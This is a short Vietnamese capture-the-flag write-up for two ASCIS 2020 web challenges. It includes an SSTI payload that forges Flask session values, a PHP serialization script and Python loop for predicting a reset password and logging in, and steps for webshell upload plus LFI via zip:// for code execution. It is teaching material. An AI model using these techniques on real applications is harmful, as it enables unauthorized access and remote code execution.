---
title: "ASCIS 2020 Quals - Web short writeup"
summary: "Short writeup for Web challenge that I solved in ASCIS 2020 Quals"
date: 2020-11-01
tags: ["ctf", "web"]
---
## TSULOTT3
Đề chỉ có 1 file `main.py` như sau:
```python
from flask import Flask, session, request, render_template, render_template_string
from flask_session import Session
from random import randint as ri

app = Flask(__name__)
SESSION_TYPE = 'filesystem'
app.config.from_object(__name__)
Session(app)
cheat = "Pls Don't cheat! "

def check_session(input):
	if session.get(input) == None:
		return ""
	return session.get(input)

@app.route("/", methods=["GET","POST"])
def index():
	try:
		session.pop("name")
		session.pop("jackpot")
	except:
		pass
	if request.method == "POST":
		ok = request.form['ok']
		session["name"] = request.form['name']
		if ok == "Go":
			session["check"] = "access"
			jackpot = " ".join(str(x) for x in [ri(10,99), ri(10,99), ri(10,99), ri(10,99), ri(10,99), ri(10,99)]).strip()
			session["jackpot"] = jackpot
			return render_template_string("Generating jackpot...<script>setInterval(function(){ window.location='/guess'; }, 500);</script>")
	return render_template("start.html")

@app.route('/guess', methods=["GET","POST"])
def guess():
	try:
		if check_session("check") == "":
			return render_template_string(cheat+check_session("name"))
		else:
			if request.method == "POST":
				jackpot_input = request.form['jackpot']
				if jackpot_input == check_session("jackpot"):
					mess = "Really? GG "+check_session("name")+", here your flag: ASCIS{xxxxxxxxxxxxxxxxxxxxxxxxx}"
				elif jackpot_input != check_session("jackpot"):
					mess = "May the Luck be with you next time!<script>setInterval(function(){ window.location='/reset_access'; }, 1200);</script>"
				return render_template_string(mess)
			return render_template("guess.html")
	except:
		pass
	return render_template_string(cheat+check_session("name"))


@app.route('/reset_access')
def reset():
	try:
		session.pop("check")
		return render_template_string("Reseting...<script>setInterval(function(){ window.location='/'; }, 500);</script>")
	except:
		pass
	return render_template_string(cheat+check_session("name"))


if __name__ == "__main__":
	app.secret_key = 'xxxxxxxxxxxxxxxxxxxxx'
	app.run()
```
### Cách 1
Đây là cách mình sử dụng để solve trong lúc thi.
```
POST /

name={% set x=session.update({'check': 'access', 'jackpot': ''}) %}&ok=
```
```
POST /guess

jackpot=
```
### Cách 2
*Không khai thác SSTI, sưu tầm từ các đội khác sau khi thi.*

1. Submit name bất kì tại `/`, sau đó sẽ được redirect sang `/guess`.
```python
# Mô tả session
session = {'name': 'anything', 'check': 'access', 'jackpot': 'xx xx xx xx xx xx'}
```
2. Truy cập lại về `/`.
```python
# Mô tả session
session = {'check': 'access'}
```
3. Quay trở lại `/guess` và submit với 1 input rỗng (vì hàm `check_session` sẽ trả về chuỗi rỗng nếu key không tồn tại).

## among_us
1. Viết PHP script để generate ra `ticket` và password mới cho user
```php
<?php
class CrewMate {
	public $name = 'tsu';
	public $secret_number = [1, 2, 3, 4, 5, 6, 7, 8, 9];
}

$arr = new CrewMate;
$se = serialize($arr);

echo base64_encode($se) . PHP_EOL;

$de = unserialize($se);
$secret_number = strtoupper($de->secret_number);
$random_rand = rand(0, $secret_number);
srand($random_rand);
$new_password = "";
while (strlen($new_password) < 30) {
    $new_password .= strval(rand());
}
echo 'New password: ' . $new_password . PHP_EOL;
?>
```
2. Viết Python script để tự động hóa việc lấy token để đăng nhập
```python
from re import findall
from hashlib import md5
import requests

REGEX_TOKEN = r'name="token" value="(.*?)"'
PHPSESSID = '' # Nhập PHPSESSID vào biến

while True:
    res = requests.get('http://35.240.156.48/?page=forgot', cookies={
        'PHPSESSID': PHPSESSID
    })
    token = findall(REGEX_TOKEN, res.text)[0]
    res = requests.post('http://35.240.156.48/?page=forgot', data={
        'ticket': 'Tzo4OiJDcmV3TWF0ZSI6Mjp7czo0OiJu[redacted]', # Ticket được lấy từ PHP script ở trên
        'token': token
    }, cookies={
        'PHPSESSID': PHPSESSID
    })

    res = requests.get('http://35.240.156.48/?page=login', cookies={
        'PHPSESSID': PHPSESSID
    })
    token = findall(REGEX_TOKEN, res.text)[0]
    res = requests.post('http://35.240.156.48/?page=login', data={
        'username': 'tsu',
        'password': '117856802212731241191535857466', # Password được lấy từ PHP script ở trên
        'token': token
    }, cookies={
        'PHPSESSID': PHPSESSID
    })
```
Chạy cho đến khi script bị lỗi tại hàm `findall` thì dừng lại (vì login xong sẽ không còn form login nữa nên không thể lấy được token, dẫn đến lỗi).

3. Upload 1 PHP webshell và server sẽ tạo 1 file zip chứa file mình mới upload lên và sẽ được xóa cho đến khi có 1 lượt upload khác.
4. Sử dụng lỗi LFI ở trang `index.php` + zip wrapper (`zip://`) để include PHP shell trong file zip => RCE.
5. Lấy flag ở trong database.
